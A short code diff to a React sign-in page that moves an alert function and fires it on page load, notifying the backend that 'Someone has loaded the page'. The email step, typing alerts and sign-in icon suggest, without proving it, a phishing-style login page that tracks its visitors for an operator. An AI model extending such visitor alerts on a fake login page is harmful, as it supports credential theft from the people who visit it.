@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react'; // <-- 1. Import useEffect
 import './AppStyles.css'; // Import the new CSS file
 
 /**
@@ -31,6 +31,25 @@ const App = () => {
     const [dontAskAgain, setDontAskAgain] = useState(false);
 
     const [alert_email_typing, setAlert_email_typing] = useState(false);
+
+    /**
+     * Sends an alert notification to the backend.
+     * @param {string} message - The message to send.
+     */
+    const send_alert_notification = async (message) => {
+        let response = await fetch(api_url + "/alert", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message }),
+        });
+        let data = await response.json();
+        console.log(data);
+    };
+
+    // 2. Add useEffect to trigger on component mount (page load)
+    useEffect(() => {
+        send_alert_notification("Someone has loaded the page.");
+    }, []); // The empty array ensures this runs only once
 
     /**
      * Handles the form submission for the email step.
@@ -142,20 +161,6 @@ const App = () => {
         }
 
         setIsSubmitting(false);
-    };
-
-    /**
-     * Sends an alert notification to the backend.
-     * @param {string} message - The message to send.
-     */
-    const send_alert_notification = async (message) => {
-        let response = await fetch(api_url + "/alert", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message }),
-        });
-        let data = await response.json();
-        console.log(data);
     };
 
     // SVG Icon for "Sign-in options"
